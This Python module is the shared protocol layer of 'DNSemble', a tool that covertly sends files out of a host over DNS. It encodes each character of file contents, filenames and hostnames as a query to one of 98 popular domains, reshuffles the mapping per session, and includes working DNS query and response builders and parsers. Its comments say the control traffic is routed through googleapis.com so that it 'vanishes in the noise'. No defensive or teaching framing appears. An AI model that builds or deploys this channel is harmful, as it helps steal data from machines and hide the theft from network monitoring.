#!/usr/bin/env python3
"""
DNSemble - Shared domain mapping and protocol constants.

Maps 95 printable ASCII characters (0x20-0x7E) plus \\n, \\t, \\r
to 98 well-known domains.  The domain queried IS the data channel.

DYNAMIC MAPPING — the char-to-domain assignment is shuffled per
session.  On SESSION_START the server picks a random 32-bit seed,
returns it as the A-record IP in the response, and both sides feed
that seed into the same deterministic PRNG to build identical
permutation tables.  No pre-shared key file required.

Protocol layout
───────────────
  Transaction ID (16 bits):
    High byte [15:8] = client_id  (0-255)
    Low  byte  [7:0] = seq_num    (0-255, wraps with CHUNK control)

  Control channel:
    A query to CONTROL_DOMAIN ("googleapis.com")
    seq byte = control code (0-3) or chunk offset (≥4)

  Data channel (QTYPE selects the phase):
    A    (1)  = file content character
    AAAA (28) = hostname character
    MX   (15) = filename character
"""

import struct
import random as _random

# ---------------------------------------------------------------------------
# Control domain — all control signals go here as plain A queries.
# googleapis.com is one of the most-queried domains on the planet,
# so these packets vanish in the noise.
# ---------------------------------------------------------------------------
CONTROL_DOMAIN = "googleapis.com"

# ---------------------------------------------------------------------------
# 98 well-known domains — the data-encoding pool
# ---------------------------------------------------------------------------
DOMAINS = [
    "google.com",           # 0
    "youtube.com",          # 1
    "facebook.com",         # 2
    "twitter.com",          # 3
    "instagram.com",        # 4
    "linkedin.com",         # 5
    "reddit.com",           # 6
    "pinterest.com",        # 7
    "tumblr.com",           # 8
    "snapchat.com",         # 9
    "github.com",           # 10
    "stackoverflow.com",    # 11
    "microsoft.com",        # 12
    "apple.com",            # 13
    "amazon.com",           # 14
    "netflix.com",          # 15
    "spotify.com",          # 16
    "twitch.tv",            # 17
    "discord.com",          # 18
    "telegram.org",         # 19
    "ebay.com",             # 20
    "walmart.com",          # 21
    "target.com",           # 22
    "bestbuy.com",          # 23
    "etsy.com",             # 24
    "shopify.com",          # 25
    "paypal.com",           # 26
    "stripe.com",           # 27
    "squarespace.com",      # 28
    "wix.com",              # 29
    "godaddy.com",          # 30
    "namecheap.com",        # 31
    "cloudflare.com",       # 32
    "cnn.com",              # 33
    "bbc.com",              # 34
    "nytimes.com",          # 35
    "reuters.com",          # 36
    "forbes.com",           # 37
    "bloomberg.com",        # 38
    "wsj.com",              # 39
    "theguardian.com",      # 40
    "washingtonpost.com",   # 41
    "usatoday.com",         # 42
    "espn.com",             # 43
    "weather.com",          # 44
    "imdb.com",             # 45
    "rottentomatoes.com",   # 46
    "hulu.com",             # 47
    "disneyplus.com",       # 48
    "soundcloud.com",       # 49
    "vimeo.com",            # 50
    "dailymotion.com",      # 51
    "deviantart.com",       # 52
    "flickr.com",           # 53
    "booking.com",          # 54
    "expedia.com",          # 55
    "tripadvisor.com",      # 56
    "airbnb.com",           # 57
    "uber.com",             # 58
    "lyft.com",             # 59
    "zillow.com",           # 60
    "realtor.com",          # 61
    "yelp.com",             # 62
    "opentable.com",        # 63
    "dropbox.com",          # 64
    "box.com",              # 65
    "notion.so",            # 66
    "trello.com",           # 67
    "slack.com",            # 68
    "zoom.us",              # 69
    "skype.com",            # 70
    "evernote.com",         # 71
    "todoist.com",          # 72
    "asana.com",            # 73
    "wikipedia.org",        # 74
    "quora.com",            # 75
    "khanacademy.org",      # 76
    "coursera.org",         # 77
    "udemy.com",            # 78
    "edx.org",              # 79
    "duolingo.com",         # 80
    "archive.org",          # 81
    "britannica.com",       # 82
    "dictionary.com",       # 83
    "yahoo.com",            # 84
    "bing.com",             # 85
    "duckduckgo.com",       # 86
    "brave.com",            # 87
    "whatsapp.com",         # 88
    "signal.org",           # 89
    "tiktok.com",           # 90
    "claude.ai",            # 91
    "anthropic.com",        # 92
    "openai.com",           # 93
    "x.com",                # 94
    "tesla.com",            # 95
    "spacex.com",           # 96
    "oracle.com",           # 97
]

# ---------------------------------------------------------------------------
# Character set: printable ASCII (32-126) + \n \t \r  → 98 entries
# ---------------------------------------------------------------------------
_PRINTABLE = [chr(i) for i in range(32, 127)]
_SPECIAL   = ["\n", "\t", "\r"]
ALL_CHARS  = _PRINTABLE + _SPECIAL

assert len(DOMAINS) == len(ALL_CHARS) == 98

CHAR_TO_INDEX  = {ch: i for i, ch in enumerate(ALL_CHARS)}
DOMAIN_TO_INDEX = {d: i for i, d in enumerate(DOMAINS)}

# ---------------------------------------------------------------------------
# QTYPE constants  (data-phase selector)
# ---------------------------------------------------------------------------
QTYPE_A    = 1    # content
QTYPE_MX   = 15   # filename
QTYPE_TXT  = 16   # pool request
QTYPE_AAAA = 28   # hostname

QTYPE_LABELS = {QTYPE_A: "A", QTYPE_AAAA: "AAAA", QTYPE_MX: "MX", QTYPE_TXT: "TXT"}

# ---------------------------------------------------------------------------
# Control codes  (seq byte when domain == CONTROL_DOMAIN, qtype == A)
# ---------------------------------------------------------------------------
CTRL_SESSION_START = 0
CTRL_END_HOSTNAME  = 1
CTRL_END_FILENAME  = 2
CTRL_END_CONTENT   = 3
CTRL_CHUNK_OFFSET  = 3   # seq >= 4 → NEXT_CHUNK, chunk = seq - CTRL_CHUNK_OFFSET

CTRL_LABELS = {
    0: "SESSION_START",
    1: "END_HOSTNAME",
    2: "END_FILENAME",
    3: "END_CONTENT",
}

# ---------------------------------------------------------------------------
# Dynamic mapping  — seeded permutation
# ---------------------------------------------------------------------------
def generate_permutation(seed: int) -> list:
    """Deterministic shuffle of 0..97 — same seed ⇒ same result."""
    rng = _random.Random(seed)
    perm = list(range(len(ALL_CHARS)))
    rng.shuffle(perm)
    return perm

def build_char_to_domain(perm: list, domains: list = None) -> dict:
    """char → domain lookup from a permutation."""
    domains = domains or DOMAINS
    return {ALL_CHARS[ci]: domains[perm[ci]] for ci in range(len(perm))}

def build_domain_to_char(perm: list, domains: list = None) -> dict:
    """domain → char lookup (inverse) from a permutation."""
    domains = domains or DOMAINS
    return {domains[perm[ci]]: ALL_CHARS[ci] for ci in range(len(perm))}

def seed_to_ip(seed: int) -> str:
    b = seed.to_bytes(4, "big")
    return f"{b[0]}.{b[1]}.{b[2]}.{b[3]}"

def ip_to_seed(ip_bytes: bytes) -> int:
    return int.from_bytes(ip_bytes, "big")

# ---------------------------------------------------------------------------
# Transaction ID helpers
# ---------------------------------------------------------------------------
def encode_txid(client_id: int, seq_num: int) -> int:
    return ((client_id & 0xFF) << 8) | (seq_num & 0xFF)

def decode_txid(txid: int) -> tuple:
    return (txid >> 8) & 0xFF, txid & 0xFF

# ---------------------------------------------------------------------------
# DNS wire-format helpers  (pure Python, zero dependencies)
# ---------------------------------------------------------------------------
def encode_domain_name(domain: str) -> bytes:
    out = b""
    for label in domain.split("."):
        out += struct.pack("B", len(label)) + label.encode("ascii")
    return out + b"\x00"

def decode_domain_name(data: bytes, offset: int) -> tuple:
    labels = []
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:
            ptr = struct.unpack("!H", data[offset:offset + 2])[0] & 0x3FFF
            sub, _ = decode_domain_name(data, ptr)
            labels.append(sub)
            offset += 2
            return ".".join(labels), offset
        offset += 1
        labels.append(data[offset:offset + length].decode("ascii"))
        offset += length
    return ".".join(labels), offset

def build_dns_query(txid: int, domain: str, qtype: int) -> bytes:
    header = struct.pack("!6H", txid, 0x0100, 1, 0, 0, 0)
    question = encode_domain_name(domain) + struct.pack("!2H", qtype, 1)
    return header + question

def parse_dns_query(data: bytes):
    if len(data) < 12:
        return None
    txid, flags, qdcount = struct.unpack("!3H", data[:6])
    if qdcount < 1:
        return None
    qname, offset = decode_domain_name(data, 12)
    if offset + 4 > len(data):
        return None
    qtype, _ = struct.unpack("!2H", data[offset:offset + 4])
    return txid, qname, qtype

def build_dns_response(query_data: bytes, ip: str = "0.0.0.0") -> bytes:
    if len(query_data) < 12:
        return query_data
    txid = query_data[0:2]
    flags = struct.pack("!H", 0x8180)
    counts = struct.pack("!4H", 1, 1, 0, 0)
    header = txid + flags + counts
    raw_q = query_data[12:]
    end = raw_q.index(b"\x00") + 1
    qsection = raw_q[:end + 4]
    octets = [int(o) for o in ip.split(".")]
    answer = (
        struct.pack("!H", 0xC00C)
        + struct.pack("!HHI", 1, 1, 300)
        + struct.pack("!H", 4)
        + bytes(octets)
    )
    return header + qsection + answer

def parse_a_record(data: bytes):
    """Extract 4 raw IP bytes from the first A record in a DNS response."""
    if len(data) < 12:
        return None
    ancount = struct.unpack("!H", data[6:8])[0]
    if ancount < 1:
        return None
    offset = 12
    while offset < len(data) and data[offset] != 0:
        offset += 1 + data[offset]
    offset += 1 + 4                       # null terminator + QTYPE + QCLASS
    if offset + 2 > len(data):
        return None
    if (data[offset] & 0xC0) == 0xC0:
        offset += 2
    else:
        while offset < len(data) and data[offset] != 0:
            offset += 1 + data[offset]
        offset += 1
    if offset + 10 > len(data):
        return None
    rtype = struct.unpack("!H", data[offset:offset + 2])[0]
    offset += 8                           # TYPE + CLASS + TTL
    rdlen = struct.unpack("!H", data[offset:offset + 2])[0]
    offset += 2
    if rtype == 1 and rdlen == 4 and offset + 4 <= len(data):
        return data[offset:offset + 4]
    return None

def build_dns_txt_response(query_data: bytes, text: str) -> bytes:
    """Build a DNS response with a TXT record containing the given text."""
    if len(query_data) < 12:
        return query_data
    txid = query_data[0:2]
    flags = struct.pack("!H", 0x8180)
    counts = struct.pack("!4H", 1, 1, 0, 0)
    header = txid + flags + counts
    raw_q = query_data[12:]
    end = raw_q.index(b"\x00") + 1
    qsection = raw_q[:end + 4]
    text_bytes = text.encode("ascii")
    rdata = b""
    off = 0
    while off < len(text_bytes):
        chunk = text_bytes[off:off + 255]
        rdata += struct.pack("B", len(chunk)) + chunk
        off += 255
    answer = (
        struct.pack("!H", 0xC00C)
        + struct.pack("!HHI", QTYPE_TXT, 1, 300)
        + struct.pack("!H", len(rdata))
        + rdata
    )
    return header + qsection + answer

def parse_txt_record(data: bytes):
    """Extract concatenated TXT strings from a DNS response."""
    if len(data) < 12:
        return None
    ancount = struct.unpack("!H", data[6:8])[0]
    if ancount < 1:
        return None
    offset = 12
    while offset < len(data) and data[offset] != 0:
        offset += 1 + data[offset]
    offset += 1 + 4
    if offset + 2 > len(data):
        return None
    if (data[offset] & 0xC0) == 0xC0:
        offset += 2
    else:
        while offset < len(data) and data[offset] != 0:
            offset += 1 + data[offset]
        offset += 1
    if offset + 10 > len(data):
        return None
    rtype = struct.unpack("!H", data[offset:offset + 2])[0]
    offset += 8
    rdlen = struct.unpack("!H", data[offset:offset + 2])[0]
    offset += 2
    if rtype != QTYPE_TXT:
        return None
    result = b""
    end = offset + rdlen
    while offset < end and offset < len(data):
        slen = data[offset]
        offset += 1
        result += data[offset:offset + slen]
        offset += slen
    return result.decode("ascii")

def build_servfail(query_data: bytes) -> bytes:
    if len(query_data) < 12:
        return query_data
    return query_data[0:2] + struct.pack("!H", 0x8182) + query_data[4:]
